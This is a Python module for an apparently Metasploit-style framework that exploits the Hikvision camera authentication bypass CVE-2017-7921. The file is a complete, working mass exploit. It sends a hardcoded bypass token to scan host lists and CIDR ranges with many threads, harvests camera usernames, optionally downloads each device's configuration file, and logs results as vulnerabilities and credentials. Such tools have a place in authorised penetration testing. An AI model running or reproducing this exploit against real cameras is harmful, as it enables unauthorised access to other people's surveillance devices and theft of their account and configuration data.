import ipaddress
import re
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from core import colors
from core.auxiliary import Auxiliary
from core.check import CheckResult
from core.module import Option
from core.progress import ProgressBar

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

@dataclass
class HostResult:
    host: str
    vulnerable: bool = False
    users: list = field(default_factory=list)
    error: str | None = None


class HikvisionAuthBypass(Auxiliary):
    NAME = "Hikvision IP Camera Authentication Bypass (CVE-2017-7921)"
    DESCRIPTION = (
        "Exploits the HikCGI 'auth' parameter which accepts a base64-encoded "
        "username:password but ignores the password entirely. Supports single "
        "hosts, comma lists, CIDR, ranges, and file: target specs."
    )

    AUTHOR = "K3ysTr0K3R"
    RANK = "normal"
    SEVERITY = "critical"
    DISCLOSED = "2017-09-23"
    CHECK = True
    REFERENCES = [
        "CVE-2017-7921",
        "https://ipvm.com/reports/hik-exploit",
        "https://seclists.org/fulldisclosure/2017/Sep/23",
    ]

    OPTIONS = [
        Option("RHOSTS", required=True,
               description="target(s): host | h1,h2 | CIDR | range | file:path"),
        Option("RPORT", default=80, type=int, description="HTTP port"),
        Option("SSL", default=False, type=bool, description="use HTTPS"),
        Option("TIMEOUT", default=5.0, type=float, description="per-request timeout"),
        Option("THREADS", default=50, type=int, description="concurrent workers"),
        Option("DUMP_CONFIG", default=False, type=bool,
               description="download encrypted config for vulnerable hosts"),
        Option("STOP_ON_FIRST", default=False, type=bool,
               description="stop scanning after first vulnerable host"),
    ]

    BYPASS_TOKEN = "YWRtaW46MTEK"

    def _expand_targets(self) -> list[str]:
        hosts = self.resolve_targets()
        if not hosts:
            raise ValueError("no targets — set RHOSTS (or use run <target>)")
        if len(hosts) > 1:
            print(colors.info(f"target list -> {len(hosts)} hosts"))
        return hosts

    def _base_url(self, host):
        scheme = "https" if self.options["SSL"] else "http"
        return f"{scheme}://{host}:{self.options['RPORT']}"

    def _get(self, host, path, stream=False):
        url = f"{self._base_url(host)}{path}?auth={self.BYPASS_TOKEN}"
        return requests.get(
            url,
            timeout=self.options["TIMEOUT"],
            verify=False,
            stream=stream,
            allow_redirects=False,
        )

    def _check_host(self, host: str, bar: ProgressBar | None = None) -> HostResult:
        result = HostResult(host=host)
        try:
            r = self._get(host, "/Security/users")
        except requests.exceptions.RequestException as e:
            result.error = type(e).__name__
            return result
        if r.status_code != 200:
            result.error = f"HTTP {r.status_code}"
            return result
        body = r.text
        if "<User" not in body and "<userName>" not in body:
            result.error = "no user list"
            return result
        result.vulnerable = True
        result.users = re.findall(r"<userName>([^<]+)</userName>", body)
        if self.options["DUMP_CONFIG"]:
            self._dump_config(host, bar)
        return result

    def _dump_config(self, host, bar=None):
        try:
            r = self._get(host, "/System/configurationFile", stream=True)
            if r.status_code != 200:
                return
            fname = f"hikvision_{host.replace('.', '_')}_config.bin"
            with open(fname, "wb") as f:
                for chunk in r.iter_content(chunk_size=8192):
                    f.write(chunk)

            msg = colors.good(f"  [{host}] saved config -> {fname}")

            (bar.log if bar else print)(msg)

        except (requests.exceptions.RequestException, OSError):

            pass

    def _record_host_result(self, h):
        svc_name = "https" if self.options["SSL"] else "http"
        self.report_host(h.host, state="up")
        self.report_service(
            h.host, self.options["RPORT"],
            proto="tcp", state="open",
            name=svc_name, banner="Hikvision",
        )
        self.report_vuln(
            name=self.NAME,
            address=h.host,
            severity="critical",
            refs="CVE-2017-7921",
            info="auth bypass | users=" + ",".join(h.users or ["?"]),
        )
        for user in (h.users or []):
            self.report_cred(
                h.host, user, "",
                kind="username",
                info="CVE-2017-7921 user enumeration",
            )

    def check(self):
        targets = self._expand_targets()
        if len(targets) > 1:
            print(colors.warn(
                f"check on multiple targets: probing only {targets[0]} "
                f"(use 'run' to scan all {len(targets)})"
            ))
        host = targets[0]
        print(colors.info(f"check: probing {self._base_url(host)}"))
        res = self._check_host(host)
        if res.vulnerable:
            print(colors.vuln(
                f"check: {host} vulnerable — {len(res.users)} user(s) exposed"
            ))
            return CheckResult.VULNERABLE
        if res.error:
            print(colors.safe(f"check: {host} not vulnerable ({res.error})"))
        return CheckResult.SAFE

    def action(self):
        targets = self._expand_targets()
        threads = max(1, self.options["THREADS"])
        stop_first = self.options["STOP_ON_FIRST"]
        print(colors.info(f"scanning {len(targets)} host(s) with {threads} threads"))
        bar = ProgressBar(total=len(targets), prefix="scan")
        hits: list[HostResult] = []
        errors = 0
        aborted = False

        db = self._db()
        workspace_active = bool(db and db.current_workspace_id())

        try:
            with ThreadPoolExecutor(max_workers=threads) as ex:
                futures = {ex.submit(self._check_host, h, bar): h for h in targets}
                for fut in as_completed(futures):
                    bar.tick()
                    try:
                        res = fut.result()
                    except Exception:
                        errors += 1
                        continue
                    if res.vulnerable:
                        hits.append(res)
                        users = ", ".join(res.users) if res.users else "?"
                        bar.log(colors.vuln(f"{res.host} — users: {users}"))
                        if workspace_active:
                            self._record_host_result(res)
                        if stop_first:
                            aborted = True
                            for f in futures:
                                f.cancel()
                            break
                    elif res.error:
                        errors += 1
        finally:
            bar.done()
        print()
        print(colors.heading("--- scan summary ---"))
        print(f"  targets:      {len(targets)}")
        print(f"  vulnerable:   {colors.green(str(len(hits)))}")
        print(f"  errors/skips: {colors.dimmed(str(errors))}")
        if aborted:
            print(colors.warn("  scan aborted early (STOP_ON_FIRST)"))
        if workspace_active and hits:
            ws = db.current_workspace()
            print("  recorded:     " + colors.dimmed(
                f"{len(hits)} host(s), {len(hits)} service(s), "
                f"{len(hits)} vuln(s) in workspace '{ws}'"
            ))
        if hits:
            print(colors.heading("  vulnerable hosts:"))
            for h in hits:
                print(f"    {colors.vuln(h.host)}  users: {', '.join(h.users) or '?'}")
        return hits
